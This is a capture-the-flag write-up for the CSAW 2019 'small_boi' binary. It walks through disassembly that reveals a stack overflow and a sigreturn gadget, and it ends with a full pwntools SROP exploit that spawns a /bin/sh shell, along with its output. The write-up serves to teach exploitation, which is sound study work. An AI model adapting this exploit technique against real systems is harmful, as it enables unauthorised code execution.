# Csaw 2019 Smallboi

Let's take a look at the binary:

```
$    file small_boi
small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
$    pwn checksec small_boi
[*] '/Hackery/pod/modules/16-srop/csaw19_smallboi/small_boi'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./small_boi
15935728
```

So we can see that we are dealing with a `64` bit binary, with `NX`. When we run the binary, it prompts us for input.

## Reversing

So when we look at the binary in Ghidra, we see some interesting assembly:

```
                             //
                             // .text
                             // SHT_PROGBITS  [0x40017c - 0x4001c9]
                             // ram: 0040017c-004001c9
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_0040017c()
             undefined         AL:1           <RETURN>
                             FUN_0040017c                                    XREF[3]:     004001e0, 00400218(*),
                                                                                          _elfSectionHeaders::00000090(*)  
        0040017c 55              PUSH       RBP
        0040017d 48 89 e5        MOV        RBP,RSP
        00400180 b8 0f 00        MOV        EAX,0xf
                 00 00
        00400185 0f 05           SYSCALL
        00400187 90              NOP
        00400188 5d              POP        RBP
        00400189 c3              RET
        0040018a 58              ??         58h    X
        0040018b c3              ??         C3h
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_0040018c()
             undefined         AL:1           <RETURN>
             undefined1        Stack[-0x28]:1 local_28                                XREF[1]:     00400190(*)  
                             FUN_0040018c                                    XREF[3]:     entry:004001b6(c), 004001e8,
                                                                                          00400238(*)  
        0040018c 55              PUSH       RBP
        0040018d 48 89 e5        MOV        RBP,RSP
        00400190 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
        00400194 48 89 c6        MOV        RSI,RAX
        00400197 48 31 c0        XOR        RAX,RAX
        0040019a 48 31 ff        XOR        RDI,RDI
        0040019d 48 c7 c2        MOV        RDX,0x200
                 00 02 00 00
        004001a4 0f 05           SYSCALL
        004001a6 b8 00 00        MOV        EAX,0x0
                 00 00
        004001ab 5d              POP        RBP
        004001ac c3              RET
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined entry()
             undefined         AL:1           <RETURN>
                             entry                                           XREF[4]:     Entry Point(*), 00400018(*),
                                                                                          004001f0, 00400258(*)  
        004001ad 55              PUSH       RBP
        004001ae 48 89 e5        MOV        RBP,RSP
        004001b1 b8 00 00        MOV        EAX,0x0
                 00 00
        004001b6 e8 d1 ff        CALL       FUN_0040018c                                     undefined FUN_0040018c()
                 ff ff
        004001bb 48 31 f8        XOR        RAX,RDI
        004001be 48 c7 c0        MOV        RAX,0x3c
                 3c 00 00 00
        004001c5 0f 05           SYSCALL
        004001c7 90              NOP
        004001c8 5d              POP        RBP
        004001c9 c3              RET
                             //
                             // .rodata
                             // SHT_PROGBITS  [0x4001ca - 0x4001d1]
                             // ram: 004001ca-004001d1
                             //
                             s_/bin/sh_004001ca                              XREF[1]:     _elfSectionHeaders::000000d0(*)  
        004001ca 2f 62 69        ds         "/bin/sh"
                 6e 2f 73
                 68 00
```

So we see a small amount of assembly instructions. We see that it starts at `0x4001ad`, which it then calls the `0x40018c` function. We see that that code there will make a read syscall, which will scan in `0x200` bytes worth of data. Looking at the layout of the stack (or just checking out the memory in gdb), we see that after `0x28` bytes of input from that read syscall we overwrite the return address. So we have a buffer overflow.

## Exploitation

So we can get code execution. The problem now is what code will we execute? The binary has very little instructions with it, and isn't linked with libc:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/pod/modules/16-srop/csaw19_smallboi/small_boi
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /Hackery/pod/modules/16-srop/csaw19_smallboi/small_boi
0x00007ffff7ffb000 0x00007ffff7ffe000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

In addition to that, the Stack is not executable. However there is a function that will help us:

```
                             //
                             // .text
                             // SHT_PROGBITS  [0x40017c - 0x4001c9]
                             // ram: 0040017c-004001c9
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_0040017c()
             undefined         AL:1           <RETURN>
                             FUN_0040017c                                    XREF[3]:     004001e0, 00400218(*),
                                                                                          _elfSectionHeaders::00000090(*)  
        0040017c 55              PUSH       RBP
        0040017d 48 89 e5        MOV        RBP,RSP
        00400180 b8 0f 00        MOV        EAX,0xf
                 00 00
        00400185 0f 05           SYSCALL
        00400187 90              NOP
        00400188 5d              POP        RBP
        00400189 c3              RET
        0040018a 58              ??         58h    X
        0040018b c3              ??         C3h
```

This will make a sigreturn call, where the input is what is on the stack. What we can do is call this function, and provide a sigreturn frame as the input. This will allow us to perform an SROP attack. When we do this, the stack will shift by `0x8` bytes so we will need to account for that in our exploit.

Now for the SROP attack, we will make a syscall to `execve("/bin/sh", NULL, NULL)`. Luckily for us, the string `/bin/sh` is in the binary at `0x4001ca`:

```
                             //
                             // .rodata
                             // SHT_PROGBITS  [0x4001ca - 0x4001d1]
                             // ram: 004001ca-004001d1
                             //
                             s_/bin/sh_004001ca                              XREF[1]:     _elfSectionHeaders::000000d0(*)  
        004001ca 2f 62 69        ds         "/bin/sh"
                 6e 2f 73
                 68 00
```

That is everything we need to write the exploit.

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './small_boi': pid 3434
[*] Switching to interactive mode
$ w
 21:17:05 up 16 min,  1 user,  load average: 0.12, 0.19, 0.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               21:00   ?xdm?  51.68s  0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
exploit.py  readme.md  small_boi
$  
```